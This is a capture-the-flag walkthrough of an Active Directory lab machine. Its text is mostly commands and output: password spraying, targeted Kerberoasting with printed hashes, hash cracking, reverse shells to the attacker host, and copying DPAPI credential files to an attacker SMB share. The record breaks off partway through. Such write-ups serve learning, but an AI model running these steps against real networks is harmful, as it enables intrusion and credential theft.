# Voleur

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sV -sC -T4 voleur.htb  
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-09-24 22:11 EDT
Nmap scan report for voleur.htb (10.10.11.76)
Host is up (0.036s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 10:11:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-09-25T10:11:49
|_  start_date: N/A
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Sync the time with the DC

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo rdate -n 10.10.11.72
```

NTLM auth doesn’t work

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt'   
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
```

So we use kerberos auth

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         voleur.htb      445    voleur           [*]  x64 (name:voleur) (domain:htb) (signing:True) (SMBv1:False)
SMB         voleur.htb      445    voleur           [-] htb\\ryan.naylor:HollowOct31Nyt [Errno Connection error (HTB:88)] [Errno -2] Name or service not known
```

We still get an error, so we try ldap auth

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
LDAP        voleur.htb      389    DC.voleur.htb    [*]  x64 (name:DC.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
LDAP        voleur.htb      389    DC.voleur.htb    [+] voleur.htb\\ryan.naylor:HollowOct31Nyt
```

LDAP works and show us we need to call for dc.voleur.htb

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt
```

SMB

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

To access SMB with kerberos auth, we need to create a TGT for our user

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-getTGT 'voleur.htb/ryan.naylor' -dc-ip 10.10.11.76               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in ryan.naylor.ccache
```

Then export the ticket into the memory and check it was loaded

```bash
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=ryan.naylor.ccache                                                  
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ klist   
Ticket cache: FILE:ryan.naylor.ccache
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
09/25/2025 07:02:54  09/25/2025 17:02:54  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/26/2025 06:58:20
```

We try to connect with smbclient, but we can’t find a way, so we use impacket-smbclient

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-smbclient -k -no-pass dc.voleur.htb     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls 
[-] No share selected
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls 
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
# cd First-Line Support
# ls 
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
# exit
```

We get the file Access\_Review.xlsx. We try to open it on LibreOfficeCalc, but it is password protected

We crack the pass

```bash
┌──(kali㉿kali)-[~]
└─$ office2john Access_Review.xlsx > hash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
No password hashes left to crack (see FAQ)
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FSF9yYi5xM0kkww1vV9dh%2Fimage.png?alt=media&#x26;token=af4a95a5-ba60-401e-8683-c24d673f0e2d" alt=""><figcaption></figcaption></figure>

todd.wolfe:NightT1meP1dg3on14

We make a user and password file and password spray

```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb dc.voleur.htb -u users -p pass -k --continue-on-success
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Ryan.Naylor:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Marie.Bryant:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Lacey.Miller:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Todd.Wolfe:NightT1meP1dg3on14 KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Jeremy.Combs:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Administrator:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_backup:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_ldap:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_iis:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_winrm:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Ryan.Naylor:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Marie.Bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Lacey.Miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Todd.Wolfe:M1XyC9pW7qT5Vn KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Jeremy.Combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\\svc_ldap:M1XyC9pW7qT5Vn 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Ryan.Naylor:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Marie.Bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Lacey.Miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Todd.Wolfe:N5pXyW1VqM7CZ8 KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Jeremy.Combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\\svc_iis:N5pXyW1VqM7CZ8 
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
```

svc\_iis:N5pXyW1VqM7CZ8

svc\_ldap:M1XyC9pW7qT5Vn

Ingest bloodhound data

```bash
┌──(kali㉿kali)-[~/voleur]
└─$ nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --bloodhound --collection All --dns-server 10.10.11.76
LDAP        voleur.htb      389    DC.voleur.htb    [*]  x64 (name:DC.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
LDAP        voleur.htb      389    DC.voleur.htb    [+] voleur.htb\\ryan.naylor:HollowOct31Nyt 
LDAP        voleur.htb      389    DC.voleur.htb    Resolved collection methods: objectprops, session, rdp, container, dcom, group, psremote, localadmin, acl, trusts
LDAP        voleur.htb      389    DC.voleur.htb    Using kerberos auth without ccache, getting TGT
LDAP        voleur.htb      389    DC.voleur.htb    Done in 00M 07S
LDAP        voleur.htb      389    DC.voleur.htb    Compressing output into /home/kali/.nxc/logs/DC.voleur.htb_voleur.htb_2025-09-26_013638_bloodhound.zip
```

Looking at bloodhound, we don’t find anything interesting for ryan or svc\_iis

svc\_ldap is more interesting

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FxnPIWbaXjSmKx5LJmY5v%2Fimage.png?alt=media&#x26;token=48a77e42-82fc-4daf-b9fc-99332c224afd" alt=""><figcaption></figcaption></figure>

We can make a targeted kerberoast attack agains svc\_winrm but first, we need a ticket for the user

```bash
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ impacket-getTGT 'voleur.htb/svc_ldap' -dc-ip 10.10.11.76                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in svc_ldap.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ export KRB5CCNAME=svc_ldap.ccache                                              
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ klist   
Ticket cache: FILE:svc_ldap.ccache
Default principal: svc_ldap@VOLEUR.HTB

Valid starting       Expires              Service principal
09/26/2025 01:58:40  09/26/2025 11:58:40  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/27/2025 01:58:33
```

Get the hash ⇒ the lacey.miller user is not interesting

```bash
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ ./targetedKerberoast.py -v -d 'VOLEUR.HTB' -u 'svc_ldap' -k --dc-host dc.voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$VOLEUR.HTB/lacey.miller*$bc51df85802f9a0f83c1dc66425943b8$27656094648c1118b691854d14c501555ee02cf9f14f43c382120bda729baa8343fe3473f78e2ff9da2392a446e6b8a382b8a5cc1457d0f91354641a2f470d74fca89b8f95cc05f1aace746977557ab5c2f9c61e75c32d2f347c44dd5cdecd0f1c3c77b6283bf50e9b35d593d2efb0dcb455d142093bef9ca74cf3f0f7de150bce4fcd684be3a935898eda54510e195b9d862b692ecc93d013a2c06f572210fe735bda06192568ebc682cffdf7ff7a168d0b80887cf7005bd95da77c3ef20d6e314defe5d0ac6e4203b10fd47bcefb5be2cd9bd89c1459eeb1370e02214550d3dbacd14a577d75d32d9976b36ab31d7728e06623db249555b4e61fa4e93fc29345cf5aef03c2e0ea211f3e49792be629c5d4e5951f2c0efc315eea8b78ccb74f3988cbf43a97ab8d71d8a67ba4b8084b7e01e4d70eec6f78a2cdab046d1b67c07c0cbb0e2335679fbed46380444a1edab1848474a42b2402d0a1ca73687986901fa79f5049c980d410beefbad5a3a3f5b9ba5a8387bbbc55bab26f3aa60149b6b40cfcd4d15b0bb79eff1a8e87919354a6b4a99f27f3a187d98e4f1181001bd72975b70774af4f8ad02e45c96fc4f6071fb490a95701e9a9f453e2e012e1533e04fceca0edd501ece88891528c4050ab94c3b47d904d5c31d80c82568f3cb8247c6415d1dd227b85f871ee9bbfe3a94e4b383932db9c149346812d3f643cb1bd05254aac9a4eaee1bf77d4f64a9c1e1a04d320717e459301f562f4c36c2785cd6f7f2d30fe5fbd161d9909f67f286b6613f21d32feeb902e9a783828c5ce1b3bca35854e0d924bdde54cb2105a6e04b79e22f3e9ef8ac5c9d13c42bb94ceab8c819dd47e47cbe310f5b90490f2b581ff30f72089416c0194459045456bad861a69e3f98c30de448f31c18a311d90a3d8af1141e509731993cac35afade6ad79548030040f25a83e315fb45c1387092f35c00a12a4aec8529108ae125a8d5681cac1be15f42453369ab572ef3cbab4cdc13346b1ef5971ee714d1c23748a79e07e1d7f3e02de6b32990bbb3cdb30a118df6c1343d5dea56841697d597e2baa8e872395b37ea82268b51b5f2d29b8268c2f615eb03e273d4af141ac0c80697e0e52248804f043ff7aeff4a58c237ece8c84d45121511eb81e736415cbe78166a91d5bcee02acce73641d488bf45e130617b51874f6ca517c5b84da7f36c4361bc69f9188cef2a6fb244f181c9e7314db5a8722236842df98ce83b314ab53e7d446a30bba752fe3f3004b4c30c6ccd37c23b456d808c9daea79a99e3b2ef47c56d3d2202d866ca2bf652bad91fab1f8c84a23de26a6a1f89767912f80b11a6f50eb47a387cc4f1a4a23ed1376d131c9f19b8ee6c15d19c52c4cf2815b3ffb8e57c47d9e6c8af59554b493788cd37728dd19ea417d0543ce3ad438eb8ea946ea28bc402190149016ec2507f37d1458591d839ee6ae
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$VOLEUR.HTB/svc_winrm*$c65b3f81fc4897906537527ec56172d0$f33d35c2e6e6bcf45c82fc42b485746b5d185179b0e69904b280e9804467b36eb3f16d76a0892727882f371e67574d23a8e41fe1fc1f8ab6ea7958931cbe875f415c0a9d7e31d631b5b3d071e15ba2f4d02c303d302104f56f5f69c33755937b360be2d87c43fa3f147b08c6187c886ad6df4038d94d028bf134aa5025a9213088746e350cb895468088d4521de08696626c73ca33e1085ac6cf0dd72f9eaf4e79b84bb7e3dedcd33d07b81da3b13ce98a48321b0c636e807b057b7cf24b65bd07ca12b5122b98f26af30a86ad1c4938da816ea65c270ad6eff5a20fc110305d85d4ee6c84ea40741f8af5cb415b0aa2f971df58923ca4fc2abad9aa51cc5a3d18605dcb2a5a551ea9cc9e4f89a16de746b372103d14b684711960dc3e41fc2106a6288e48523065e1ac4a2238862937b54e319b093fe66f83319114e2339028f928775617207c61791f12c324420061f195caa4fa417d459b869a650a8a9d1682eac0387d116e7aacfbb78dd5891273334aa12ff3aa895c203bd4c505c43348ce8eb4269f2609d5d6ab9b515696bf2aaa08b0fd59b26b948f821e44160626366420c600513efa762d4f548c0744fde07c494f1c972469738120aa21f920b4fb0957748ab612042fc97878bf953b461af8837781d52f1ec092026bf0dc1c02a8ddc36500be49d4a2bd8ff9ac3a7b2c4772bc2ca0624015181cbdaca61a5ae48f07c3112da1f91d1fd25b83d242b9ca2325d2b969aee7ecac3d57291fb0300009f0b48982c157f41c21fe28ee60093f2f4c5f8fe1bc426eee496d4832964a4f8c1830a53c030ea19d64c5ca6cf2a166f1ac4875dc701b6480243ff8aa96640e2e85a4baff67e756ced9b43f7156fcf9e859196a72ec5ceac8b24a4816d723bdcc3b6af6d17b89524acf3e6c4d8058587624ee5f474fc0149e8512b908a28be814ae084babda04b99ca247657435d7d30efc016ff895eea2a3f2da8901eacd10af905b1ed119b9151b793083606112d721f5404e313b7c1901345885bf12d6f84928e2987e9054c43847f0183e9026fe1024aa3b16946c0bf16474818188568f55ca2e83ec20717dff8759502c1e00e92036b0caa45d5897d175444d50a0bbb89f60b356eed71df5c50120b0e84b150009cec47eb0e9c60719d976e02ca5e30def5457f96a267637fe340aea39de16423e7dc3c41823f4b307fd65d45b7129c8b5c552ebc5ae60f552825ce3d9a33a58f6da672f806c94000b3ef008e022063ae02940069a55616d62abbe3f0f0e62d729f6174b6e1c3240f778ed5ab5b384dc3c6b9b45be7afbb9ea8f278d66f1c678de96d8a03b8d34e958a8126083b6bdcd62a04c5ce383edc3568c0e1b6b1c79815c442ac77e9125925769841399352be998966a2ad1b80c430fdf611e0299af3e3037249ccd50d0026744827d7d78da6c8b9b503bb1f1b51606c9e0d8103b056590ce1bcf
[VERBOSE] SPN removed successfully for (svc_winrm)
```

We crack the hash for svc\_winrm

```bash
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```

svc\_winrm:AFireInsidedeOzarctica980219afi

We get a ticket for that user

```bash
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ kdestroy
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ impacket-getTGT 'voleur.htb/svc_winrm' -dc-ip 10.10.11.76                                         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in svc_winrm.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ export KRB5CCNAME=svc_winrm.ccache                                                                    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ klist   
Ticket cache: FILE:svc_winrm.ccache
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
09/26/2025 02:12:32  09/26/2025 12:12:32  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/27/2025 02:11:03
```

To login with evil-winrm, we need to set a real in the config

```bash
┌──(kali㉿kali)-[~/voleur]
└─$ cat /etc/krb5.conf                                                                 
[libdefaults]
        default_realm = voleur.htb

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        VOLEUR.HTB = {
                kdc = dc.voleur.htb
        }
```

Next we login

```bash
┌──(kali㉿kali)-[~/Downloads/windows]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents>
```

We get the user flag

```bash
*Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop> ls 

    Directory: C:\\Users\\svc_winrm\\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-a----         9/25/2025   7:58 PM          51712 RunasCs.exe
-a----         9/25/2025   8:08 PM            321 script.ps1
-ar---         9/25/2025   7:49 PM             34 user.txt
```

We also see a runas, so we try to execute commands as other users. We are only successfull as svc\_ldap. So we get a powershell reverse shell

```bash
*Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop> .\\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.44:443
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\\Desktop: Service-0x0-5470c7$\\Default
[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 3656 created in background.

┌──(kali㉿kali)-[~/Downloads/windows]
└─$ sudo nc -lnvp 443        
listening on [any] 443 ...
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.76] 54377
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! <https://aka.ms/PSWindows>

PS C:\\Windows\\system32>
```

Inside the home directory, we find a script checking if the user Todd Wolfe is deleted

```bash
PS C:\\Users\\svc_ldap> ls 
ls 

    Directory: C:\\Users\\svc_ldap

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---          5/8/2021   1:20 AM                Desktop                                                              
d-r---         1/29/2025   4:47 AM                Documents                                                            
d-r---          5/8/2021   1:20 AM                Downloads                                                            
d-r---          5/8/2021   1:20 AM                Favorites                                                            
d-r---          5/8/2021   1:20 AM                Links                                                                
d-r---          5/8/2021   1:20 AM                Music                                                                
d-r---          5/8/2021   1:20 AM                Pictures                                                             
d-----          5/8/2021   1:20 AM                Saved Games                                                          
d-r---          5/8/2021   1:20 AM                Videos                                                               
-a----         9/25/2025   8:20 PM            321 script.ps1                                                           

PS C:\\Users\\svc_ldap> cat script.ps1 
cat script.ps1
Import-Module ActiveDirectory

$deletedObject = Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"'

if ($deletedObject) {
    # Restore the deleted AD object
    Restore-ADObject -Identity $deletedObject.Name
} else {
    Write-Host "No deleted AD object found with the name $deletedObject.Name"
```

We check for ourself and see him

```bash
PS C:\\Users\\svc_ldap> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List

Name            : Todd Wolfe
                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectGUID      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid       : S-1-5-21-3927696377-1337352550-2781715495-1110
lastKnownParent : OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

Next we re activate his account

```bash
PS C:\\Users\\svc_ldap> Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```

We can now try to login as him as we have his creds from the excel file earlier

```bash
*Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop> .\\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.44:4444
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\\Desktop: Service-0x0-5470c7$\\Default
[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 2212 created in background.

┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.76] 54540
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! <https://aka.ms/PSWindows>

PS C:\\Windows\\system32> whoami
whoami
voleur\\todd.wolfe
```

In the C:\IT we find a folder with a backup of our user directory. We find dpapi, so we open a smb server to transfer the files

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FOz3kFau3R4nlpY1CJKo5%2Fimage.png?alt=media&#x26;token=9fc48b2a-3799-40dd-aeee-ac1c443fdd47" alt=""><figcaption></figcaption></figure>

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo impacket-smbserver share -smb2support . -user ha -password Hacked@123
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.76,54572)
[*] AUTHENTICATE_MESSAGE (\\ha,DC)
[*] User DC\\ha authenticated successfully
[*] ha:::aaaaaaaaaaaaaaaa:b74186de0e7f710629884816802031b2:01010000000000000051a3a1b72edc017acb42b60f5d418c00000000010010007a00490064006c005a004b0045004e00030010007a00490064006c005a004b0045004e0002001000740042007700570054005900780042000400100074004200770057005400590078004200070008000051a3a1b72edc0106000400020000000800300030000000000000000100000000200000fede42256c720f7910536bffd3c20490f7b30417ae9ff1f0e8874d92967741a60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340034000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
```

Copy the needed files

```bash
PS C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials> ls 
ls 

    Directory: C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3                                     

PS C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials> net use n: \\\\10.10.14.44\\share /user:ha Hacked@123
net use n: \\\\10.10.14.44\\share /user:ha Hacked@123
The command completed successfully.

PS C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials> copy 772275FAD58525253490A9B0039791D3 n:\\
```

```bash
PS C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110> ls 
ls 

    Directory: C:\\IT\\Second-Line Support\\Archived 
    Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
